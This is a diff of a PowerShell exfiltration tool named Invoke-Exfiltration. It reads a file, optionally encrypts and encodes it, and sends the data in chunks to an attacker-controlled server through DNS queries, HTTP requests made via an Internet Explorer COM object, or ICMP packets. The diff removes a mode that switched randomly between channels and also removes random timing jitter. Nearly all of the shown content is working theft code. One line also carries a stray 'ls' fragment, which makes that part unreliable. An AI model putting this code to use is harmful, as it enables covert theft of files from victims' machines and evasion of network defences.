@@ -1,5 +1,5 @@
 function Invoke-Exfiltration {
-    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep)
+    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns)
     $bytes = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
@@ -9,7 +9,6 @@ function Invoke-Exfiltration {
     If ($key) {
         $data = AES $data 
     }
-
     $string = [System.BitConverter]::ToString($data);
     $string = $string -replace '-','';
     $filename = Split-Path $file -leaf
@@ -32,73 +31,18 @@ function Invoke-Exfiltration {
     # determine exfil type and send data;
 	
 
-    If ($type -eq 'ALL') {
-      
-        $IE = new-object -com internetexplorer.application;
-        $q = Send-ICMPPacket $data
-        write-host $data
-
-        for($i=0; $i-lt($repeat-1); $i++){
-            
-            $str = $string.Substring($i * $Split, $Split);
-            $sender = Get-Random -minimum 1 -maximum 4;
-            write-host $sender 
-        
-        If ($sender -eq '1') {
-            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
-            write-host $data
-            $q = Send-ICMPPacket $data
-            }
-        If ($sender -eq '2') {
-            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            write-host $data
-            $q = Send-HTTPRequest $data $IE
-            }
-        If ($sender -eq '3') {
-            $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
-            write-host $data
-            $q = Send-DNSRequest $server $data $jobid
-            }
-
-        };
-        if($remainder){
-            $str = $string.Substring($len-$remainder);
-            $i = $i +1
-
-           $sender = Get-Random -minimum 1 -maximum 3;
-
-        If ($sender -eq '1') {
-            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
-            write-host $data
-            $q = Send-ICMPPacket $data
-            }
-        If ($sender -eq '2') {
-            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            write-host $data
-            $q = Send-HTTPRequest $data $IE
-            }
-
-        };
-    
-        $i = $i + 1
-        $data = $jobid + '|!|' + $i + '|!|DONE'
-        write-host $data
-        $q = Send-ICMPPacket $data
-        };
-
-        
 
     If ($type -eq 'DNS') {
         $q = Send-DNSRequest $server $data $jobid
         for($i=0; $i-lt($repeat-1); $i++){
             $str = $string.Substring($i * $Split, $Split);
-            $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-DNSRequest $server $data $jobid
         };
         if($remainder){
             $str = $string.Substring($len-$remainder);
             $i = $i +1
-            $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-DNSRequest $server $data $jobid
         };
     
@@ -113,13 +57,13 @@ function Invoke-Exfiltration {
         $q = Send-HTTPRequest $data $IE
         for($i=0; $i-lt$repeat-1; $i++){
             $str = $string.Substring($i * $Split, $Split);
-            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-HTTPRequest $data $IE
         };
         if($remainder){
             $str = $string.Substring($len-$remainder);
             $i = $i +1
-            $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-HTTPRequest $data $IE
         };
 
@@ -132,13 +76,13 @@ function Invoke-Exfiltration {
         $q = Send-ICMPPacket $data
         for($i=0; $i-lt($repeat-1); $i++){
             $str = $string.Substring($i * $Split, $Split);
-            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-ICMPPacket $data
         };
         if($remainder){
             $str = $string.Substring($len-$remainder);
             $i = $i +1
-            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            $data = $jobid + '|!|' + $i + '|!|' + $str
             $q = Send-ICMPPacket $data
         };
     
@@ -153,10 +97,7 @@ function Send-HTTPRequest {
     $url = "http://" + $server + ":" + $port + "/";
     $data = Base64 $data;
     $IE.navigate2($url+$data)
-    If (!$sleep) {
-        $sleep = Get-Random -minimum 0 -maximum 8; 
-    }
-    Start-Sleep -s $sleep;
+    Start-Sleep -s 2;
 };
 
 function Send-ICMPPacket {
@@ -169,10 +110,7 @@ function Send-ICMPPacket {
     $PingOptions.DontFragment = $True
     $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
     $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
-    If (!$sleep) {
-        $sleep = Get-Random -minimum 0 -maximum 8; 
-    }
-    Start-Sleep -s $sleep;
+    Start-Sleep -s 1;;ls
 };
 
 function Send-DNSRequest {
@@ -186,22 +124,13 @@ function Send-DNSRequest {
     for($i=0; $i-lt($repeat); $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
-        #$q = nslookup -querytype=A $str $server -timeout= 5;
-        $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
+        $q = nslookup -querytype=A $str $server;
     };
     if($remainder){
         $str = $data.Substring($len-$remainder);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
-        #$q = nslookup -querytype=A $str $server -timeout= 5;
-        $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
-
+        $q = nslookup -querytype=A $str $server;
     };
-    If (!$sleep) {
-        $sleep = Get-Random -minimum 0 -maximum 8; 
-    }
-    Start-Sleep -s $sleep;
 }; 
   
 function Base64 {
